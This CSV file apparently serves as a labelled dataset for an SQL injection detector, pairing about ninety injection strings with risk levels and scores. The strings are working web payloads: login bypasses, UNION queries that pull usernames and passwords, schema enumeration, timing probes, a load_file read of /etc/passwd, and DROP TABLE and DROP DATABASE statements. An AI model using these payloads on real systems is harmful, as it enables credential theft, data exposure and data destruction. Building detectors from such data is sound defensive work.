query,risk,score
"' UNION SELECT username, password FROM users /**/ /* test */",medium,40
' HAVING 1=1 #,medium,40
'; DELETE FROM users; /**/,critical,100
' or true/*,low,10
1' OR '1'='1,low,10
user' or 'x'='x,low,10
'; DROP TABLE users; -- /* test */,critical,100
1' or 1=1 #,low,10
user' Or 'x'='x,low,10
' or 'a'='a,low,10
admin' /**/,low,10
admin' --,low,10
'; SELECT load_file('/etc/passwd'); #,critical,100
1' or true --,low,10
1' or 1=1 --,low,10
admin'-- -,low,10
' Or 1=1 -- /* test */,low,10
' Or 'x'='x,low,10
' or true#,low,10
"' UNION SELECT NULL, column_name FROM information_schema.columns --",high,70
' Or 'x'='x,low,10
1' or '1'='1' --,low,10
' OR true --,low,10
user' or 'x'='x,low,10
1'  or  '1'='1' --,low,10
admin'/* ,low,10
' or 'a'='a,low,10
' OR true -- /* test */,low,10
1' Or '1'='1,low,10
user' or 'x'='x,low,10
1' or 1=1 /**/,low,10
' OR '1'='1' --,low,10
1'; SELECT * FROM users /**/,medium,40
' OR 1=1 LIMIT 1 --,low,10
' OR TRUE #,low,10
"' UNION SELECT uid, pwd FROM members /**/",medium,40
' or 'x'='x,low,10
' or 1 LIKE 1/*,low,10
1' or 1=1 --,low,10
';  SELECT  COUNT(*) FROM users --,medium,40
1' or '1'='1' #,low,10
admin'; SELECT * FROM users WHERE name LIKE '%admin%' #,medium,40
1' or 1=1 /**/,low,10
1' or '1'='1' /**/,low,10
"' AND (SELECT benchmark(1000000, MD5('x'))) #",high,70
"' UNION SELECT NULL, sqlite_version() /**/",high,70
' OR TRUE --,low,10
' or 2>1 --,low,10
1=1' or '1'='1,low,10
' OR 'a'='a,low,10
1=1' OR '1'='1,low,10
' or 1=1#,low,10
' or 1=1 LIMIT 1 --,low,10
user' OR 'x'='x,low,10
"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables /**/",high,70
"' UNION SELECT username, password FROM users WHERE 1=1 --",medium,40
admin'/*,low,10
' OR '1'='1,low,10
"' AND (SELECT benchmark(1000000, MD5('x'))) #",high,70
' Or 2>1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 2>1 --,low,10
' Or '1'='1,low,10
admin'/*,low,10
1' or '1'='1' --,low,10
') OR ('a'='a,low,10
' or true/*,low,10
1'; SELECT  * FROM users --,medium,40
"' UNION SELECT  username, password FROM  users WHERE 1=1  --",medium,40
'; DROP DATABASE db_name; /**/,critical,100
' OR '1'='1' --,low,10
admin'/*,low,10
' OR true --,low,10
"' UNION SELECT uid, pwd FROM members #",medium,40
' or TRUE --,low,10
' OR 'x'='x,low,10
'; SELECT COUNT(*) FROM users --,medium,40
admin'-- -,low,10
admin'/*,low,10
' Or 1=1 -- /* test */,low,10
' OR 'x'='x,low,10
1=1' OR '1'='1,low,10
1' or '1'='1' --,low,10
' OR '1'='1' /**/,low,10
admin' --,low,10
admin'# -,low,10
1' or '1'='1' --,low,10
1'; SELECT * FROM users /**/,medium,40
